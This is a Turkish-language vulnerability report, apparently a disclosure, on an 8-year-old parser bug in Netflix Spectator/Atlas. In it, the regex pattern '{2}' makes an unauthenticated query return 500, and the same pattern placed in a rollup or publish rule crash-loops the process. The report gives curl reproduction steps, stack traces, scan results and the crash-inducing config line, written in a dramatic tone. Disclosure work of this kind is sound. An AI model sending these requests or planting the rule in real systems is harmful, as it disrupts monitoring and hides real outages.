**B raporu.** Ayrı bulgu, ayrı rapor. Parser'ın `{` dalındaki boş liste çökmesi.

---

**8 yıldır açıkta duran ikinci Zero-Day: Üç karakterlik `{2}`, Atlas'a 400 yerine 500 attırıp iç istisnayı dışarı sızdırıyor**

**Özetle;**

Ortada tek bir metrik servisi var.

İstemciden gelen sorgu, `:re` operatörünün desenini derlerken kütüphanenin içine giriyor.

Desen `{2}` ise, derleyici boş bir listeyi patlatıyor.

`IndexOutOfBoundsException: Index -1 out of bounds for length 0`

Bu bir kullanıcı hatası değil, kütüphanenin kendi hatası.

Ama servis bunu ayırt edemiyor.

`IllegalArgumentException` 400 dönmesi gerekirken, bu istisna 500 olarak dışarı çıkıyor.

Kimlik gerekmiyor.

Tek istek yetiyor.

Sunucu ayakta kalıyor, okuma hattı çalışmaya devam ediyor; yani bu bir kesinti değil.

Bu, servisin iç hatasını dışarıya sızdırması.

**8 yıllık bir ihmalin, asimetrik bir maliyetle taçlandırılması...**

Evet; ikinci zero-day'imizi tanıtarak devam edelim.

2018'de `#651` commit'iyle giren parser, o günden bu yana hiç değişmedi.

`Parser.term()` içindeki `'{'` dalı, listede eleman var mı diye bakmadan `pop` çağırıyor.

Aynı fonksiyondaki `'?'`, `'*'`, `'+'` dalı bakıyor ve `dangling modifier` fırlatıyor.

Yani koruma yazılmış, sadece bir dala konmuş.

`pop` ise `matchers.remove(matchers.size() - 1)`.

Boş listede `remove(-1)`.

```
1.5.3 (2018) -> 1.10.8 (2026-09-23)   hepsi etkileniyor
upstream main (cb9ef7f, 2026-10-21)   hâlâ etkileniyor
```

Sekiz yıl boyunca her sürümde yayınlandı.

{CVE, Advisory, Issue, PR ve PoC yok}

`:re` yolu 2018'den beri açık.

Sekiz yıldır kimsenin görmediği, görenin de raporlamadığı bir zero-day.

**Tekrarlama adımları**

Servis: atlas-standalone, `conf/memory.conf`, `localhost:7106`.

Veri gerekmiyor. Hata, sorgu ayrıştırılırken oluşuyor, indekse hiç dokunmuyor.

1. adım: referans okuma.

```
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://localhost:7106/api/v1/graph?q=name,sps,:eq'
```

Beklenen: `200`

2. adım: tek isteği at. Kimlik yok.

```
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://localhost:7106/api/v1/graph?q=name,sps,:eq,payload,%7B2%7D,:re,:and'
```

Beklenen: `500`

3. adım: aynı isteği üç kez tekrarla.

```
curl -sS -o /dev/null -w '%{http_code} ' \
  'http://localhost:7106/api/v1/graph?q=name,sps,:eq,payload,%7B2%7D,:re,:and' \
  'http://localhost:7106/api/v1/graph?q=name,sps,:eq,payload,%7B2%7D,:re,:and' \
  'http://localhost:7106/api/v1/graph?q=name,sps,:eq,payload,%7B2%7D,:re,:and'
echo
```

Beklenen: `500 500 500`

4. adım: servis ayakta mı.

```
curl -sS -o /dev/null -w '%{http_code}\n' http://localhost:7106/healthcheck
```

Beklenen: `200`

5. adım: okuma hattı çalışıyor mu.

```
curl -sS -o /dev/null -w '%{http_code}\n' \
  'http://localhost:7106/api/v1/graph?q=name,sps,:eq'
```

Beklenen: `200`

6. adım: sunucu logunda ne var.

```
grep -A5 'IndexOutOfBoundsException' run-7106.log | head -20
```

Beklenen:

```
java.lang.IndexOutOfBoundsException: Index -1 out of bounds for length 0
	at com.netflix.spectator.impl.matcher.Parser.pop(Parser.java:112)
	at com.netflix.spectator.impl.matcher.Parser.term(Parser.java:90)
	at com.netflix.spectator.impl.matcher.Parser.expr(Parser.java:60)
	at com.netflix.spectator.impl.matcher.Parser.parse(Parser.java:40)
	at com.netflix.spectator.impl.matcher.PatternMatcher.compile(PatternMatcher.java:60)
	at com.netflix.atlas.core.model.Query$Regex.<init>(Query.scala:545)
```

7. adım: aynı isteği kütüphaneye doğrudan ver, servisi atla.

```
java -cp spectator-api.jar -e 'PatternMatcher.compile("{2}")'
```

Beklenen: aynı `IndexOutOfBoundsException`, aynı `Parser.pop(Parser.java:112)` satırı.

**Neden 400 değil 500**

`RequestHandler.scala:234-247` sadece dört sınıfı 400'e eşliyor: `IllegalArgumentException`, `IllegalStateException`, `JacksonException`, `DateTimeException`.

Geri kalan her şey 500.

`IndexOutOfBoundsException` bu dördünün içinde değil.

Yani kullanıcının yazdığı üç karakter, sunucunun kendi hatası gibi görünüyor.

**Ölçüm**

```
16.104 dört karakterli desen taraması  -> 2.154 IndexOutOfBoundsException (%13,4)
66.429 desen taraması                  -> bu, belgelenmemiş tek istisna sınıfı
kimliksiz 50 istek                     -> 50'si de 500
```

**Peki ama saldırgan hedefini daha aciz bırakmak isterse?**

Buyrunuz "Pattern config", anlatıyım;

Aynı desen bir rollup kuralına yahut yayın doğrulama kuralına konulduğu takdirde, süreç henüz başlamadan sonlanır.

EVREKA...

```
rule.query = app.errors,ERROR|name|{2},:re
Exception in thread "main" java.lang.IndexOutOfBoundsException: Index -1 out of bounds
state=restarting restarts=8 exitcode=1    yayınlanan metrik: 0
aynı config ile yeniden deploy: state=restarting restarts=7, yine çıkıyor
```

Bu saatten sonra saldırganı daha hiç kimsede tutamaz, bir şey yapmasına da gerek yoktur.

Config'i insan elle düzeltene dek, her restart, her deploy aynı şekilde patlıyor ve operatörün bunu tespit etmesi asimetrik maliyet nedeniyle, o logların içinin boş bir şekilde şişmesiyle körlük başlıyor ve inanılmaz maliyetli, içinden çıkılamaz bir hâle evriliyor.

Bakınız;

"Could not find a constructor for class ValuePatternRule" patternin adı logda hiç geçmiyor.

**Peki güzelce buraya geldik, geldik de neden biz izini bulamıyoruz?**

Çünkü;

`Rule.scala:93-105`, `Throwable`'ı yakalayıp cause'u düşürerek sabit bir reflection mesajı atıyor:

```
Rule.load(bozuk config) -> RuntimeException: Could not find a constructor for class ValuePatternRule
                           cause=null  suppressed=0
doğrudan çağrı        -> IndexOutOfBoundsException: Index -1 out of bounds
ham method.invoke      -> InvocationTargetException, cause aynı
```

Operatörü sınıfa, classloader'a, bağımlılık sürümüne yolluyor.

Yanlış olan tek string'e değil.

Eee? ne kaldı geriye, operatör kör, neyi engelleyeceğini bilmiyor ortalık 56, restart sonrası tekrar edip etmeyeceğini kanıtlayamıyor, kök nedeni gösterecek hiçbir veriye sahip değil, çünkü bilmesini sağlayan sistem yaralı...

**Ama en can alıcı nokta şu ki bu sınıf sizin için yeni değil.**

Nasıl? dediğiniz duyar gibiyim, buyrunuz efenim;

Aynı fonksiyonun bir dalında kontrol var, diğerinde yok.

```
case '?' | '*' | '+' =>
  if (matchers.isEmpty) throw new IllegalArgumentException("dangling modifier")
  ...
case '{' =>
  matchers.add(repeat(pop(matchers)))     <- kontrol yok
```

Korumayı yazmışsınız, bir dala bağlamışsınız, diğerini açık bırakmışsınız.

Tak tak tak girdi adam...

Well, well, well.

```
a?        -> IllegalArgumentException "dangling modifier", 400
a*        -> IllegalArgumentException "dangling modifier", 400
a+        -> IllegalArgumentException "dangling modifier", 400
{2}       -> IndexOutOfBoundsException, 500
```

**Yaratıcı.**

Haliyle `{` karakteri her sorguda, her dashboard'da, her alarm kuralında cirit atıyor.

**Gelelim maliyete... işte Maliyet'in asimetrisi;**

Saldırganın üç karakter harcaması koca bir sistemi 500'e boğmaya yeter.

Savunmacı ise stack trace'in içinde `Parser.pop` satırını arıyor, elinde hangi desenin geldiğine dair tek bir kayıt yok.

Günün sonunda elinde hiçbir adli başlangıç noktası olmadan, tamamen samanlıkta iğne arıyor.

O instance'ın 500 alarmları sürekli çalıyor, gerçek arızalar o gürültünün içinde kayboluyor...

Kanıtı da masada bıraktım, buyrunuz sahne sizin...
